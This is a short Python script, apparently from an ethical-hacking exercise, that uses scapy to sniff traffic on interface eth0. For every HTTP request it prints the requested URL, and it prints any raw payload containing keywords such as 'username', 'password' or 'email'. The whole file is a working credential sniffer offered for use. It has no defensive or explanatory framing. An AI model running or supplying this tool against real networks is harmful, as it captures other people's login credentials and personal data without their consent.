#!/usr/bin/env python3

import scapy.all as scapy
from scapy.layers import http


def sniffer(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load_byte = packet[scapy.Raw].load
        load_str = str(load_byte)
        keywords = ["username", "user", "login", "password", "pass", "email", "phone number"]
        for kw in keywords:
            if kw in load_str:
                return load_str
                #print(f'\n\n [+] Possibe username/password >> {load}\n\n')
                #break


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        #print(packet.show())
        url = get_url(packet).decode()
        print(f"[+] HTTP Request >> {url}")

        login_info = get_login_info(packet)
        if login_info:
            print(f'\n\n [+] Possibe username/password >> {login_info}\n\n')
        
    

sniffer("eth0")